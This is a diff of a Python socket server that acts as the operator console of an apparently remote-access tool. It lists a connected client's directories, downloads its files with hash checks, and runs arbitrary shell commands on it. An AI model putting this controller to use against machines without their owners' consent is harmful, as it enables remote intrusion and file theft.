@@ -1,5 +1,5 @@
 import os
-import sys
+import threading
 from hashlib import sha256
 from socket import *
 
@@ -7,19 +7,18 @@ server_port = 34561
 serverSocket = socket(AF_INET, SOCK_STREAM)
 serverSocket.bind(('', server_port))
 serverSocket.listen(1)
-STOCK = '\033[0;0m'
-BLUE = '\033[1;34m'
 slash = '/' if os.name != 'nt' else '\\'
 DATA_PATH = 'File Received'
+current_path = ''
 
 
 def ls():
     connectionSocket.send('ls'.encode())
-    sys.stdout.write(BLUE)
+    print('\033[94m', end='')
     while True:
         ret = connectionSocket.recv(1024).decode()
         if ret == '/':
-            sys.stdout.write(STOCK)
+            print('\033[0m', end='')
         else:
             if ret == '.':
                 break
@@ -79,12 +78,13 @@ def getall():
 
 
 def recive(file_name):
+    progress = 0
     try:
         file_size = connectionSocket.recv(1024).decode()
         if file_size == 'File not found':
-            raise FileNotFoundError
+            raise Exception('File not found')
         if file_size == 'Permission denied':
-            raise OSError
+            raise Exception('Permission denied')
         connectionSocket.send('ok'.encode())
         file_hash = connectionSocket.recv(1024).decode()
         connectionSocket.send('ok'.encode())
@@ -113,28 +113,20 @@ def recive(file_name):
         if sha256(open(DATA_PATH + slash + file_name, 'rb').read()).hexdigest() == file_hash:
             print('File received successful!')
             return True
-    except FileNotFoundError:
-        print('File not found')
-    except OSError:
-        print('Permission denied')
+    except Exception as e:
+        print(e)
 
 
 def command(cmd):
     connectionSocket.send('command'.encode())
     connectionSocket.send(cmd.encode())
-    file_size = connectionSocket.recv(1024).decode()
-    if file_size == 'Command not found':
-        print(file_size)
-    elif file_size == 'Command timeout':
-        print(file_size)
-    elif file_size != 'No Output':
-        connectionSocket.send('ok'.encode())
-        current_size = 0
-        while current_size < int(file_size):
-            # 1048576, 1024, 8196, 65536, 1024000...
-            data = connectionSocket.recv(1024).decode()
-            print(data, end='')
-            current_size = current_size + len(data)
+    output = connectionSocket.recv(1024).decode()
+    while True:
+        if output == 'ok':
+            break
+        print(output, flush=True, end='')
+        output = connectionSocket.recv(1024).decode()
+    print()
 
 
 def platform():
@@ -151,27 +143,17 @@ switcher = {
     'command': command,
     'platform': platform}
 
-connected = False
-while True:
-    while not connected:
-        print('Server listening on port', server_port)
-        print('Waiting for a new connection')
-        connectionSocket, addr = serverSocket.accept()
-        outputfilename = str(addr) + ".log"
-        current_path = pwd()
-        print('New connection from ' + str(addr))
-        connected = True
 
-    while connected:
+def master():
+    global current_path
+    current_path = pwd()
+    while True:
         try:
             cmd = input(current_path + ' >> ')
             if cmd == '':
                 continue
             array = cmd.split(sep=' ', maxsplit=1)
-            try:
-                connectionSocket.send(''.encode())
-            except ConnectionError:
-                connected = False
+            connectionSocket.send(''.encode())
 
             if array[0] == 'cd':
                 try:
@@ -188,11 +170,18 @@ while True:
                     switcher[array[0]]()
                 else:
                     command(cmd)
-                # raise ValueError("Command not recognized")
-        except ConnectionError:
-            sys.stdout.write(STOCK)
-            print('A client has disconnected')
-            print()
-            input('Press enter to continue')
-            os.system('cls')
-            connected = False
+        except Exception as e:
+            print(e)
+            break
+
+
+# main
+if __name__ == '__main__':
+    while True:
+        print('Server listening on port', server_port)
+        print('Waiting for a new connection')
+        connectionSocket, addr = serverSocket.accept()
+        print('Connection from', addr)
+        t = threading.Thread(target=master())
+        t.start()
+        print('Connection closed')
